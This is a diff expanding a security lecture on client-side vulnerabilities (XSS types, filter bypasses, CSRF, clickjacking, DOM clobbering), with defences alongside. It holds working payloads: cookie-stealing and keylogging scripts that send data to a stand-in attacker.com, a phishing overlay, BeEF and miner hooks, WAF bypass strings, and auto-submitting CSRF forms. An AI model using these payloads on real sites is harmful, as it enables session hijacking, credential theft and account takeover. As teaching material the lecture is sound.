@@ -1,180 +1,1340 @@
-# Client Side Vulnerabilities
+# Client-Side Vulnerabilities
 
-## Cross-site Scripting (XSS)
+Client-side vulnerabilities exploit weaknesses in how web browsers and client-side code handle user input and external data. Unlike server-side vulnerabilities that execute on the server, client-side attacks execute in the victim's browser, potentially compromising the user's session, data, and interactions with the web application. This lecture covers the most critical client-side vulnerabilities and their mitigations.
 
-XSS vulnerabilities occur when an application includes untrusted data in new web pages without proper validation or escaping, which can be executed by the web browser.
+## Cross-Site Scripting (XSS)
 
-There are three main types of XSS attacks. These are:
+Cross-Site Scripting (XSS) is one of the most prevalent and dangerous web vulnerabilities. XSS occurs when an attacker injects malicious scripts into web pages viewed by other users. These scripts execute in the victim's browser with the same privileges as the legitimate application code.
 
-- Reflected XSS, where the malicious script comes from the current HTTP request.
+### Why XSS is Dangerous
 
-- Stored XSS, where the malicious script comes from the website's database.
+**Impact of XSS:**
 
-- DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.
+1. **Session Hijacking**: Steal session cookies and impersonate users
+2. **Credential Theft**: Capture keystrokes, form inputs, passwords
+3. **Phishing**: Display fake login forms or modify page content
+4. **Malware Distribution**: Redirect to malicious sites or download malware
+5. **Defacement**: Modify website appearance
+6. **Data Exfiltration**: Access and steal sensitive information
+7. **Account Takeover**: Change passwords, email addresses
+8. **Propagation**: Create self-replicating XSS worms (stored XSS)
+9. **Cryptocurrency Mining**: Use victim's CPU for mining
+10. **Complete Application Control**: Execute any action the user can perform
 
-### Reflected XSS
+### Types of XSS
 
-The payload is embedded directly into the current HTTP request (often found in URL query parameters) and reflected off the web server. Attackers need to trick users into clicking a link with the malicious payload. Reflected XSS is also sometimes referred to as Non-Persistent or Type-I XSS (the attack is carried out through a single request / response cycle).
+XSS vulnerabilities are classified into three main types based on how the payload is delivered and executed.
 
-Here is a simple example of a reflected XSS vulnerability:
+## 1. Reflected XSS (Non-Persistent)
 
-```html
-https://insecure-website.com/status?message=All+is+well.
+**Definition**: The malicious script is embedded in the HTTP request (typically URL or form data) and immediately reflected back in the response without proper sanitization.
 
-<p>Status: All is well.</p>
+**Characteristics:**
+
+- Requires user interaction (clicking malicious link)
+- Payload not stored on server
+- Single request/response cycle
+- Also called Type-I or Non-Persistent XSS
+
+### Reflected XSS Example
+
+**Vulnerable Application:**
+
+```php
+<?php
+// search.php
+$query = $_GET['q'];
+echo "<h1>Search results for: " . $query . "</h1>";
+?>
 ```
 
-The application doesn't perform any other processing of the data, so an attacker can easily construct an attack like this:
+**Normal Request:**
 
-```html
-https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
-
-<p>Status: <script>/* Bad stuff here... */</script></p>
+```url
+https://example.com/search?q=security
+Response: <h1>Search results for: security</h1>
 ```
 
-### Stored XSS
+**Malicious Request:**
 
-The payload is stored on the server (e.g., in a database, logs, etc.) and then later displayed to users. It doesn't require direct interaction by the victim beyond visiting the affected website. Stored XSS is also sometimes referred to as Persistent or Type-II XSS.
-
-The payload in question might be submitted to the application via HTTP requests; for example, comments on a blog post, user nicknames in a chat room, or contact details on a customer order.
-
-Here is a simple example of a stored XSS vulnerability. Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:
-
-```html
-POST /post/comment HTTP/1.1
-Host: vulnerable-website.com
-Content-Length: 100
-
-postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
+```url
+https://example.com/search?q=<script>alert(document.cookie)</script>
+Response: <h1>Search results for: <script>alert(document.cookie)</script></h1>
 ```
 
-After this comment has been submitted, any user who visits the blog post will receive the following within the application's response:
+**Attack Scenario:**
 
-```html
-<p>This post was extremely helpful.</p>
+1. Attacker crafts malicious URL:
+
+   ```url
+   https://example.com/search?q=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
+   ```
+
+2. Attacker sends URL to victim via:
+   - Email phishing
+   - Social media
+   - Malicious website
+   - SMS/messaging apps
+
+3. Victim clicks link
+4. Script executes in victim's browser
+5. Cookie sent to attacker's server
+
+**URL Encoding to Evade Detection:**
+
+```url
+https://example.com/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
 ```
 
-Assuming the application doesn't perform any other processing of the data, an attacker can submit a malicious comment like this:
+### Advanced Reflected XSS Payloads
 
-```html
-<script>/* Bad stuff here... */</script>
+**Basic Alert:**
+
+```javascript
+<script>alert(document.domain)</script>
 ```
 
-Within the attacker's request, this comment would be URL-encoded as:
+**Cookie Exfiltration:**
 
-```html
-comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
+```javascript
+<script>
+fetch('https://attacker.com/steal?c=' + document.cookie);
+</script>
 ```
 
-Any user who visits the blog post will now receive the following within the application's response:
+**Image Tag (No Script Tags):**
 
 ```html
-<p><script>/* Bad stuff here... */</script></p>
+<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
 ```
 
-The script supplied by the attacker will then execute in the victim user's browser, in the context of their session with the application.
+**SVG Payload:**
 
-### DOM-based XSS
+```html
+<svg onload="alert(1)">
+```
 
-The client's Document Object Model (DOM) is manipulated. Here, the payload might be properly handled by the server, but poorly manipulated by client-side scripts leading to the vulnerability.
+**Iframe Injection:**
 
-In the following example, an application uses some JavaScript to read the value from an input field and write that value to an element within the HTML:
+```html
+<iframe src="javascript:alert(document.cookie)">
+```
 
-```js
+## 2. Stored XSS (Persistent)
+
+**Definition**: The malicious script is permanently stored on the server (database, file, logs, etc.) and executed whenever users access the affected page.
+
+**Characteristics:**
+
+- Stored in application's database/storage
+- Executes automatically when page loads
+- No direct user interaction required
+- Most dangerous type of XSS
+- Also called Type-II or Persistent XSS
+- Can create XSS worms
+
+### Stored XSS Example
+
+**Vulnerable Comment System:**
+
+```php
+<?php
+// Save comment
+$comment = $_POST['comment'];
+$db->query("INSERT INTO comments (text) VALUES ('$comment')");
+
+// Display comments
+$comments = $db->query("SELECT text FROM comments");
+foreach ($comments as $comment) {
+    echo "<div class='comment'>" . $comment['text'] . "</div>";
+}
+?>
+```
+
+**Attack Scenario:**
+
+1. **Attacker submits comment:**
+
+   ```html
+   <script>
+   // Steal cookies from all visitors
+   fetch('https://attacker.com/collect', {
+     method: 'POST',
+     body: JSON.stringify({
+       cookie: document.cookie,
+       url: window.location.href,
+       user: document.querySelector('.username')?.innerText
+     })
+   });
+   </script>
+   ```
+
+2. Comment stored in database
+3. Every user viewing comments page executes the script
+4. Attacker collects data from all victims
+
+### Stored XSS Attack Vectors
+
+**User Profiles:**
+
+```html
+Username: <img src=x onerror="alert(1)">
+Bio: <svg onload="alert(document.domain)">
+Website: javascript:alert(1)
+```
+
+**Forum Posts:**
+
+```html
+[b]Bold text[/b] <script>/* Malicious code */</script>
+```
+
+**File Uploads (SVG):**
+
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full"
+     xmlns="http://www.w3.org/2000/svg">
+  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900"
+           stroke="#004400"/>
+  <script type="text/javascript">
+    alert(document.domain);
+  </script>
+</svg>
+```
+
+**Contact Forms:**
+
+```html
+Name: <img src=x onerror=alert(1)>
+Message: Click <a href="javascript:void(fetch('//attacker.com/steal?c='+document.cookie))">here</a>
+```
+
+### Self-Replicating XSS Worm
+
+**Samy Worm (MySpace 2005) - Concept:**
+
+```javascript
+<script>
+// Payload that adds attacker as friend and posts itself
+var ajax = new XMLHttpRequest();
+ajax.open('POST', '/addFriend', true);
+ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+ajax.send('friend=attacker');
+
+// Copy payload to victim's profile
+var payload = document.getElementById('payload').innerHTML;
+var profile = new XMLHttpRequest();
+profile.open('POST', '/updateProfile', true);
+profile.send('bio=' + encodeURIComponent(payload));
+</script>
+```
+
+## 3. DOM-Based XSS
+
+**Definition**: The vulnerability exists in client-side JavaScript code that improperly handles user input, modifying the DOM without proper sanitization.
+
+**Characteristics:**
+
+- Payload never sent to server
+- Executed entirely in browser
+- Server-side filters ineffective
+- Harder to detect with traditional tools
+- Sources: URL fragments, postMessage, localStorage
+
+### DOM XSS Sources (Input Points)
+
+**URL-Based Sources:**
+
+- `location.href`
+- `location.hash` (#fragment)
+- `location.search` (?query)
+- `document.URL`
+- `document.documentURI`
+- `document.referrer`
+
+**Other Sources:**
+
+- `window.name`
+- `postMessage` data
+- `localStorage` / `sessionStorage`
+- `IndexedDB`
+- `WebSocket` messages
+
+### DOM XSS Sinks (Dangerous Functions)
+
+**Code Execution:**
+
+- `eval()`
+- `Function()`
+- `setTimeout()` with string argument
+- `setInterval()` with string argument
+
+**HTML Modification:**
+
+- `element.innerHTML`
+- `element.outerHTML`
+- `document.write()`
+- `document.writeln()`
+
+**Attribute Modification:**
+
+- `element.src`
+- `element.href`
+- `element.action`
+- `element.formaction`
+- `element.srcdoc`
+
+**jQuery Sinks:**
+
+- `$()`
+- `.html()`
+- `.append()`
+- `.after()`
+
+### DOM XSS Examples
+
+#### Example 1: innerHTML
+
+```javascript
+// Vulnerable code
 var search = document.getElementById('search').value;
 var results = document.getElementById('results');
 results.innerHTML = 'You searched for: ' + search;
 ```
 
-If the attacker can control the value of the input field, they can easily construct a malicious value that causes their own script to execute:
+**Attack:**
 
 ```html
-You searched for: <img src=1 onerror='/* Bad stuff here... */'>
+<input id="search" value="<img src=x onerror=alert(1)>">
 ```
 
-In a typical case, the input field would be populated from part of the HTTP request, such as a URL query string parameter, allowing the attacker to deliver an attack using a malicious URL, in the same manner as reflected XSS.
+#### Example 2: location.hash
 
-### Impact of XSS vulnerabilities
+```javascript
+// Vulnerable code
+var name = location.hash.substring(1);
+document.write('Welcome ' + name);
+```
 
-An attacker who exploits a cross-site scripting vulnerability is typically able to:
+**Attack:**
 
-- Impersonate or masquerade as the victim user.
-- Carry out any action that the user is able to perform.
-- Read any data that the user is able to access.
-- Capture the user's login credentials.
-- Perform virtual defacement of the web site.
-- Inject trojan functionality into the web site.
+```url
+https://example.com/page#<img src=x onerror=alert(1)>
+```
 
-The actual impact of an XSS attack generally depends on the nature of the application, its functionality and data, and the status of the compromised user.
+#### Example 3: jQuery
 
-### XSS Mitigation
+```javascript
+// Vulnerable code
+var input = location.hash.substring(1);
+$('#content').html('Results: ' + input);
+```
 
-Preventing cross-site scripting is trivial in some cases but can be much harder depending on the complexity of the application and the ways it handles user-controllable data.
+**Attack:**
 
-In general, effectively preventing XSS vulnerabilities is likely to involve a combination of the following measures:
+```url
+https://example.com/#<script>alert(1)</script>
+```
 
-- **Filter input on arrival.** At the point where user input is received, filter as strictly as possible based on what is expected or valid input.
+#### Example 4: Attribute Sink
 
-- **Encode data on output.** At the point where user-controllable data is output in HTTP responses, encode the output to prevent it from being interpreted as active content. Depending on the output context, this might require applying combinations of HTML, URL, JavaScript, and CSS encoding.
+```javascript
+// Vulnerable code
+var url = location.hash.substring(1);
+document.getElementById('link').href = url;
+```
 
-- **Use appropriate response headers.** To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the `Content-Type` and `X-Content-Type-Options` headers to ensure that browsers interpret the responses in the way you intend.
+**Attack:**
 
-- **Content Security Policy.** As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.
+```url
+https://example.com/#javascript:alert(document.cookie)
+```
 
-## Cross-site request forgery (CSRF)
+### Advanced DOM XSS
 
-Cross-Site Request Forgery (CSRF) is an attack that abuses the browser's automatic cookie submission for cross-origin requests to issue state changing requests on the user's behalf. In other words, the attack is meant to trick users into issuing requests by abusing browser session cookie management.
+**Template Literals:**
 
-### How does CSRF work?
+```javascript
+// Vulnerable
+const name = location.hash.substring(1);
+document.body.innerHTML = `<h1>Hello ${name}</h1>`;
+```
 
-For a CSRF attack to be possible, three key conditions must be in place:
+**Prototype Pollution Leading to DOM XSS:**
 
-- **A relevant action.** There is an action within the application that the attacker has a reason to induce. This might be a privileged action (such as modifying permissions for other users) or any action on user-specific data (such as changing the user's own password).
+```javascript
+// Pollute prototype
+Object.prototype.innerHTML = '<img src=x onerror=alert(1)>';
 
-- **Cookie-based session handling.** Performing the action involves issuing one or more HTTP requests, and the application relies solely on session cookies to identify the user who has made the requests. There is no other mechanism in place for tracking sessions or validating user requests.
+// Later in code (vulnerable if it reads from prototype)
+someElement.innerHTML = config.template; // Uses polluted prototype
+```
 
-- **No unpredictable request parameters.** The requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.
+## Mutation XSS (mXSS)
 
-Here is an example to make things clearer:
+**Definition**: XSS that exploits browser's HTML parser inconsistencies and mutation behavior, bypassing sanitization.
 
-![CSRF Example](images/csrf.webp)
+**How It Works:**
 
-1. Here we can see the user issuing a request to view <http://nathanhauk.com>, a malicious website hosted by the attacker.
+1. Input passes sanitization
+2. Browser's parser mutates the HTML
+3. Mutation creates valid XSS payload
 
-1. When the server receives this request, it serves a page that contains a form designated to <http://slack.com/fakevotingservice> which allows you to vote on your favorite way to spell the word "grey".
+**Example:**
 
-1. When the user receives the response, their browser interprets the HTML and automatically issues the request with the session tokens that belong to that origin. (The browser automatically issues a request with the user's cookies to the voting service)
+```html
+<!-- Input (passes sanitizer) -->
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
 
-1. The server receives the victim's state changing request, processes it and updates the state on the server accordingly.
+<!-- After browser parsing (mXSS) -->
+<noscript><p title=""></noscript><img src=x onerror=alert(1)>
+```
 
-> Find another example at: <https://portswigger.net/web-security/csrf#how-does-csrf-work>
+**Another Example:**
 
-### Defense against CSRF
+```html
+<!-- Input -->
+<form><math><mtext></form><form><mglyph><style><!--</style><img src=x onerror=alert(1)>
 
-Nowadays, successfully finding and exploiting CSRF vulnerabilities often involves bypassing anti-CSRF measures deployed by the target website, the victim's browser, or both. The most common defenses you'll encounter are as follows:
+<!-- Browser mutation creates XSS -->
+```
 
-#### **CSRF Tokens**
+**Mitigation:**
 
-- These are unique, secret values generated server-side and shared with the client. When the client performs sensitive actions, such as form submission, the correct CSRF token must be included in the request. This prevents attackers from crafting valid requests on behalf of victims.
+- Use DOMPurify with safe parsing mode
+- Avoid innerHTML, use textContent
+- Implement strict CSP
 
-#### **SameSite Cookies**
+## XSS Filter Bypasses
 
-- A browser mechanism where cookies are only sent in requests coming from the site that set the cookie. This can prevent attackers from initiating cross-site actions.
+### 1. Bypassing WAF/Filters
 
-- Note: Chrome has enforced Lax SameSite restrictions by default since 2021, with other browsers expected to follow.
+**Case Manipulation:**
 
-#### **Referer-based Validation**
+```html
+<ScRiPt>alert(1)</sCrIpT>
+<IMG SRC=x ONERROR=alert(1)>
+```
 
-- Utilizes the HTTP Referer header to confirm that requests are from the application's domain.
+**HTML Encoding:**
 
-- Limitation: Generally considered less effective than CSRF token validation.
+```html
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+```
 
-> **Note:** A lot of these countermeasures can potentially bypassed. For mire information see: <https://portswigger.net/web-security/csrf/>
+**JavaScript Encoding:**
+
+```html
+<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
+```
+
+**Hex Encoding:**
+
+```html
+<img src=x onerror="eval('\x61\x6c\x65\x72\x74\x28\x31\x29')">
+```
+
+**Unicode Escapes:**
+
+```html
+<img src=x onerror="\u{61}\u{6c}\u{65}\u{72}\u{74}(1)">
+```
+
+### 2. Bypassing Sanitization
+
+**Incomplete Tag Removal:**
+
+If filter removes `<script>`:
+
+```html
+<scr<script>ipt>alert(1)</script>
+<!-- After removal: <script>alert(1)</script> -->
+```
+
+**Event Handler Obfuscation:**
+
+```html
+<img src=x one
+rror=alert(1)>  <!-- Newline breaks detection -->
+
+<img src=x onerror
+=alert(1)>
+
+<img/src=x/onerror=alert(1)>
+```
+
+**Alternative Tags:**
+
+```html
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<iframe onload=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+```
+
+**Alternative Event Handlers:**
+
+```html
+<img src=x onerror=alert(1)>
+<img src=x onload=alert(1)>
+<img src=x onmouseover=alert(1)>
+<img src=x onclick=alert(1)>
+<img src=x onanimationstart=alert(1)>
+<img src=x onanimationend=alert(1)>
+```
+
+### 3. Context-Specific Bypasses
+
+**Inside Attribute:**
+
+```html
+" onload="alert(1)
+' onload='alert(1)
+`onload=`alert(1)
+```
+
+**Breaking Out of JavaScript String:**
+
+```javascript
+var search = 'USER_INPUT';
+
+// Attack: '; alert(1); //
+var search = ''; alert(1); //';
+```
+
+**Breaking Out of JavaScript Comment:**
+
+```javascript
+var search = 'USER_INPUT'; // Display results
+
+// Attack:
+// </script><script>alert(1)//
+```
+
+### 4. Polyglot Payloads
+
+Work in multiple contexts:
+
+```javascript
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+```
+
+Simpler polyglot:
+
+```html
+'"><img src=x onerror=alert(1)>
+```
+
+## XSS Exploitation Techniques
+
+### 1. Cookie Theft
+
+```javascript
+<script>
+fetch('https://attacker.com/steal?c=' + document.cookie);
+</script>
+```
+
+**With Image:**
+
+```javascript
+<script>
+new Image().src = 'https://attacker.com/steal?c=' + document.cookie;
+</script>
+```
+
+### 2. Keylogger
+
+```javascript
+<script>
+document.onkeypress = function(e) {
+  fetch('https://attacker.com/keys', {
+    method: 'POST',
+    body: e.key
+  });
+};
+</script>
+```
+
+### 3. Phishing
+
+```javascript
+<script>
+document.body.innerHTML = `
+  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
+    <h1>Session Expired</h1>
+    <form action="https://attacker.com/phish" method="POST">
+      Username: <input name="user"><br>
+      Password: <input type="password" name="pass"><br>
+      <button>Login</button>
+    </form>
+  </div>
+`;
+</script>
+```
+
+### 4. BeEF Hook
+
+Browser Exploitation Framework:
+
+```html
+<script src="https://attacker.com/beef/hook.js"></script>
+```
+
+Attacker gains:
+
+- Browser information
+- Plugin detection
+- Network scanning
+- Social engineering modules
+- Persistent access
+
+### 5. Cryptocurrency Mining
+
+```javascript
+<script src="https://attacker.com/miner.js"></script>
+<script>
+  var miner = new CoinHive.Anonymous('site-key');
+  miner.start();
+</script>
+```
+
+## XSS Prevention and Mitigation
+
+### 1. Input Validation
+
+**Whitelist Approach:**
+
+```javascript
+// Only allow alphanumeric
+function validateInput(input) {
+  return /^[a-zA-Z0-9]+$/.test(input);
+}
+```
+
+**Sanitize HTML:**
+
+```javascript
+// Use DOMPurify
+const clean = DOMPurify.sanitize(dirty);
+```
+
+### 2. Output Encoding
+
+**HTML Context:**
+
+```javascript
+function encodeHTML(str) {
+  return str
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#x27;')
+    .replace(/\//g, '&#x2F;');
+}
+```
+
+**JavaScript Context:**
+
+```javascript
+function encodeJS(str) {
+  return str
+    .replace(/\\/g, '\\\\')
+    .replace(/'/g, "\\'")
+    .replace(/"/g, '\\"')
+    .replace(/\n/g, '\\n')
+    .replace(/\r/g, '\\r')
+    .replace(/\t/g, '\\t');
+}
+```
+
+**URL Context:**
+
+```javascript
+const encoded = encodeURIComponent(userInput);
+```
+
+### 3. Use Safe APIs
+
+**Safe:**
+
+```javascript
+element.textContent = userInput;  // Safe
+element.setAttribute('data-value', userInput);  // Safe (for data attributes)
+```
+
+**Unsafe:**
+
+```javascript
+element.innerHTML = userInput;  // Dangerous!
+element.outerHTML = userInput;  // Dangerous!
+```
+
+### 4. Content Security Policy (CSP)
+
+```http
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'nonce-{random}' 'strict-dynamic';
+  object-src 'none';
+```
+
+### 5. HTTPOnly Cookies
+
+```http
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
+```
+
+### 6. Template Engines with Auto-Escaping
+
+**React (Auto-escapes):**
+
+```jsx
+<div>{userInput}</div>  // Automatically escaped
+```
+
+**Vue.js:**
+
+```vue
+<div>{{ userInput }}</div>  // Automatically escaped
+```
+
+**Angular:**
+
+```html
+<div>{{ userInput }}</div>  // Automatically escaped
+```
+
+### 7. Framework-Specific Protection
+
+**React - Dangerous innerHTML:**
+
+```jsx
+// Avoid this:
+<div dangerouslySetInnerHTML={{__html: userInput}} />
+
+// Use this instead:
+<div>{userInput}</div>
+```
+
+**Vue.js - v-html:**
+
+```vue
+<!-- Avoid -->
+<div v-html="userInput"></div>
+
+<!-- Use -->
+<div>{{ userInput }}</div>
+```
+
+## Cross-Site Request Forgery (CSRF)
+
+**Definition**: CSRF tricks authenticated users into executing unwanted actions on a web application where they're authenticated. The attack abuses the browser's automatic inclusion of authentication credentials (cookies) with cross-origin requests.
+
+### How CSRF Works
+
+**Prerequisites for CSRF:**
+
+1. **Relevant Action**: Privileged action or state-changing operation
+2. **Cookie-Based Authentication**: Application relies solely on cookies
+3. **No Unpredictable Parameters**: Attacker can determine all request parameters
+
+**Attack Flow:**
+
+1. Victim authenticates to `vulnerable-bank.com`
+2. Browser stores session cookie
+3. Victim visits attacker's site `evil.com`
+4. Attacker's page makes request to `vulnerable-bank.com`
+5. Browser automatically includes session cookie
+6. Request executes with victim's privileges
+
+### CSRF Attack Examples
+
+#### Example 1: GET Request
+
+**Vulnerable Endpoint:**
+
+```url
+GET /transfer?to=attacker&amount=1000
+```
+
+**Attack:**
+
+```html
+<!-- On attacker's website -->
+<img src="https://bank.com/transfer?to=attacker&amount=1000">
+```
+
+When victim loads attacker's page, image tag triggers request with victim's cookies.
+
+#### Example 2: POST Request (Auto-Submit Form)
+
+**Vulnerable Endpoint:**
+
+```url
+POST /transfer
+to=recipient&amount=1000
+```
+
+**Attack:**
+
+```html
+<html>
+<body>
+  <form id="csrf" action="https://bank.com/transfer" method="POST">
+    <input name="to" value="attacker">
+    <input name="amount" value="1000">
+  </form>
+  <script>
+    document.getElementById('csrf').submit();
+  </script>
+</body>
+</html>
+```
+
+#### Example 3: XMLHttpRequest
+
+```html
+<script>
+fetch('https://bank.com/transfer', {
+  method: 'POST',
+  credentials: 'include',  // Include cookies
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded'
+  },
+  body: 'to=attacker&amount=1000'
+});
+</script>
+```
+
+#### Example 4: Change Email (Account Takeover)
+
+```html
+<form action="https://example.com/change-email" method="POST">
+  <input name="email" value="attacker@evil.com">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+```
+
+After email changed, attacker requests password reset.
+
+### CSRF Defense Mechanisms
+
+#### 1. CSRF Tokens (Synchronizer Token Pattern)
+
+**Server-Side:**
+
+```php
+// Generate token
+$token = bin2hex(random_bytes(32));
+$_SESSION['csrf_token'] = $token;
+
+// Verify token
+if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
+    die('CSRF token validation failed');
+}
+```
+
+**Client-Side:**
+
+```html
+<form method="POST" action="/transfer">
+  <input type="hidden" name="csrf_token" value="<?= $csrf_token ?>">
+  <input name="to">
+  <input name="amount">
+  <button>Transfer</button>
+</form>
+```
+
+**AJAX Requests:**
+
+```javascript
+fetch('/transfer', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'X-CSRF-Token': getTokenFromMeta()
+  },
+  body: JSON.stringify({to: 'recipient', amount: 1000})
+});
+```
+
+#### 2. SameSite Cookies
+
+```http
+Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
+```
+
+**SameSite Values:**
+
+- **Strict**: Never sent on cross-site requests
+
+  ```http
+  Set-Cookie: session=abc123; SameSite=Strict
+  ```
+
+  ✅ Prevents all CSRF
+  ❌ Breaks legitimate cross-site navigation
+
+- **Lax** (Default in modern browsers):
+
+  ```http
+  Set-Cookie: session=abc123; SameSite=Lax
+  ```
+
+  ✅ Sent on top-level GET navigation (clicking links)
+  ❌ Not sent on POST, iframe, AJAX
+  ✅ Good balance between security and usability
+
+- **None**:
+
+  ```http
+  Set-Cookie: session=abc123; SameSite=None; Secure
+  ```
+
+  ✅ Sent on all requests (requires Secure flag)
+  ❌ No CSRF protection
+
+#### 3. Custom Headers
+
+```javascript
+fetch('/api/transfer', {
+  method: 'POST',
+  headers: {
+    'X-Requested-With': 'XMLHttpRequest',
+    'X-Custom-Header': 'value'
+  },
+  body: JSON.stringify(data)
+});
+```
+
+**Server validates:**
+
+```python
+if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
+    abort(403)
+```
+
+**Why This Works:**
+Simple requests can be sent cross-origin, but custom headers trigger CORS preflight, which attacker cannot pass without CORS headers.
+
+#### 4. Double-Submit Cookie Pattern
+
+```javascript
+// Set token in cookie and form
+document.cookie = 'csrf_token=' + token;
+
+<form>
+  <input type="hidden" name="csrf_token" value="TOKEN">
+</form>
+```
+
+**Server validates:**
+
+```python
+if request.cookies['csrf_token'] != request.form['csrf_token']:
+    abort(403)
+```
+
+#### 5. Referer/Origin Validation
+
+```python
+allowed_origins = ['https://example.com', 'https://app.example.com']
+origin = request.headers.get('Origin') or request.headers.get('Referer')
+
+if not any(origin.startswith(allowed) for allowed in allowed_origins):
+    abort(403)
+```
+
+**Limitations:**
+
+- Users can disable Referer header
+- Can be bypassed with open redirects
+- Not recommended as sole defense
+
+### CSRF Bypass Techniques
+
+#### 1. Bypass SameSite=Lax
+
+GET requests are allowed with SameSite=Lax:
+
+```html
+<a href="https://bank.com/transfer?to=attacker&amount=1000">
+  Click for prize!
+</a>
+```
+
+**Mitigation**: Use POST for state-changing operations.
+
+#### 2. Token Leakage
+
+If token appears in URL or Referer:
+
+```html
+<a href="https://bank.com/transfer?csrf_token=abc123&to=victim">
+<!-- If this leaks in Referer to attacker's site -->
+```
+
+#### 3. Token in Response
+
+If token predictable or reusable:
+
+```javascript
+// Fetch token first
+fetch('https://bank.com/get-token')
+  .then(r => r.text())
+  .then(token => {
+    // Use stolen token
+    fetch('https://bank.com/transfer', {
+      method: 'POST',
+      body: 'csrf_token=' + token + '&to=attacker'
+    });
+  });
+```
+
+**Mitigation**: Ensure CORS headers prevent cross-origin token reading.
+
+#### 4. Subdomain Takeover
+
+If attacker controls subdomain:
+
+```javascript
+// On evil.example.com (same-site!)
+document.cookie = 'csrf_token=attacker_value; domain=.example.com';
+```
+
+**Mitigation**: Don't use domain-wide cookies for CSRF tokens.
+
+## Clickjacking
+
+**Definition**: Clickjacking tricks users into clicking on something different from what they perceive, potentially causing them to perform unintended actions.
+
+### How Clickjacking Works
+
+Attacker overlays invisible iframe over deceptive content:
+
+```html
+<html>
+<head>
+  <style>
+    iframe {
+      position: absolute;
+      top: 100px;
+      left: 200px;
+      width: 500px;
+      height: 300px;
+      opacity: 0.0001;  /* Nearly invisible */
+      z-index: 2;
+    }
+    button {
+      position: absolute;
+      top: 200px;
+      left: 350px;
+      z-index: 1;
+    }
+  </style>
+</head>
+<body>
+  <iframe src="https://bank.com/delete-account"></iframe>
+  <button>Click for FREE iPHONE!</button>
+</body>
+</html>
+```
+
+User thinks they're clicking "Click for FREE iPHONE!" but actually clicking "Delete Account" button in invisible iframe.
+
+### Clickjacking Attack Scenarios
+
+**1. Like/Follow Jacking:**
+
+```html
+<iframe src="https://facebook.com/page/like"></iframe>
+<div>Click to continue...</div>
+```
+
+**2. Credential Theft:**
+
+```html
+<!-- Overlay fake login over real login iframe -->
+<iframe src="https://site.com/login"></iframe>
+```
+
+**3. Webcam/Microphone Permission:**
+
+```html
+<iframe src="https://site.com/request-permissions"></iframe>
+```
+
+**4. Drag-and-Drop:**
+
+```html
+<iframe src="data:text/html,<script>/* malicious */</script>"></iframe>
+<!-- Trick user into dragging content into browser address bar -->
+```
+
+### Clickjacking Defenses
+
+**1. X-Frame-Options Header:**
+
+```http
+X-Frame-Options: DENY
+```
+
+Cannot be embedded in any frame.
+
+```http
+X-Frame-Options: SAMEORIGIN
+```
+
+Can only be framed by same origin.
+
+**2. CSP frame-ancestors:**
+
+```http
+Content-Security-Policy: frame-ancestors 'none'
+```
+
+Modern replacement for X-Frame-Options.
+
+```http
+Content-Security-Policy: frame-ancestors 'self'
+```
+
+Only same origin can frame.
+
+```http
+Content-Security-Policy: frame-ancestors https://trusted.com
+```
+
+Specific origin can frame.
+
+**3. Frame-Busting JavaScript (Unreliable):**
+
+```javascript
+// Don't rely on this alone!
+if (top !== self) {
+  top.location = self.location;
+}
+```
+
+**Bypass:**
+
+```html
+<iframe sandbox="allow-forms allow-scripts" src="..."></iframe>
+```
+
+## Other Client-Side Vulnerabilities
+
+### DOM Clobbering
+
+**Definition**: Exploiting browser's behavior of creating global variables for HTML elements with `id` or `name` attributes.
+
+**Example:**
+
+```html
+<form id="user">
+  <input name="admin" value="true">
+</form>
+
+<script>
+// Attacker injects:
+<a id="config" href="https://attacker.com/evil.js">
+
+// Later in code:
+if (config.admin) {  // Reads from DOM, not expected object
+  // ...
+}
+
+// Or:
+let script = document.createElement('script');
+script.src = config.apiUrl;  // Points to attacker's URL
+document.body.appendChild(script);
+</script>
+```
+
+**Mitigation:**
+
+- Use `const`/`let` for variables
+- Don't rely on global scope
+- Validate types: `if (typeof config === 'object')`
+
+### Prototype Pollution
+
